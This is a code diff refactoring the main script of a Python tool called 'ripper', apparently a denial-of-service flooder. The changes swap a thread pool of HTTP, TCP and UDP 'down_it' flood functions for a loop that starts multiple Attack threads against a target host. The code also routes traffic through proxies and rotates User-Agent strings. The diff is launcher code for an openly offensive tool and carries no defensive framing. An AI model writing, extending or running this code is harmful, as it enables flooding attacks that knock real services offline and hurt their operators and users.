@@ -1,18 +1,18 @@
 import datetime
 import signal
 import sys
-import random
 import time
 from base64 import b64decode
 
-from ripper import context, common, statistic, arg_parser
-from ripper.attacks import *
+from ripper import common, statistic, arg_parser
+from ripper.actions.attack import Attack
 from ripper.constants import *
-from ripper.common import get_current_ip, format_dt, ns2s
+from ripper.context import Context, Errors
+from ripper.common import get_current_ip, ns2s
 from ripper.health_check import fetch_host_statuses
 from ripper.proxy import Proxy
 
-_ctx = Context()
+_ctx: Context = None
 
 ###############################################
 # Connection validators
@@ -77,29 +77,6 @@ def no_successful_connections_error_msg(_ctx: Context) -> str:
     if _ctx.proxy_manager.proxy_list_initial_len > 0:
         return NO_SUCCESSFUL_CONNECTIONS_ERROR_PROXY_MSG
     return NO_SUCCESSFUL_CONNECTIONS_ERROR_VPN_MSG
-
-
-def generate_headers(_ctx: Context) -> dict[str, str]:
-    headers = dict(_ctx.headers)
-    headers['User-Agent'] = random.choice(_ctx.user_agents)
-    return headers
-
-
-def create_thread_pool(_ctx: Context) -> list[threading.Thread]:
-    """Create Thread pool for selected attack method."""
-    thread_pool = []
-    for i in range(int(_ctx.threads)):
-        if _ctx.attack_method == 'http':
-            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
-        elif _ctx.attack_method == 'tcp':
-            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
-        else:  # _ctx.attack_method == 'udp':
-            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
-
-        thread_pool[i].daemon = True  # if thread exists, it dies
-        thread_pool[i].start()
-
-    return thread_pool
 
 
 def update_current_ip(_ctx: Context) -> None:
@@ -211,14 +188,18 @@ def main():
         arg_parser.print_usage()
 
     # Init context
-    context.init_context(_ctx, args)
+    global _ctx
+    _ctx = Context(args[0])
     go_home(_ctx)
     # Proxies should be validated during the runtime
-    connect_host_loop(_ctx, retry_cnt=(1 if _ctx.proxy_manager.proxy_list_initial_len > 0 or _ctx.attack_method == 'udp' else 5))
+    connect_host_loop(
+        _ctx,
+        retry_cnt=(1 if _ctx.proxy_manager.proxy_list_initial_len > 0 or _ctx.attack_method == 'udp' else 5))
     _ctx.validate()
 
     time.sleep(.5)
-    create_thread_pool(_ctx)
+    for _ in range(_ctx.threads):
+        Attack(_ctx.target, _ctx.attack_method, _ctx).start()
 
     statistic.render_statistic(_ctx)
 
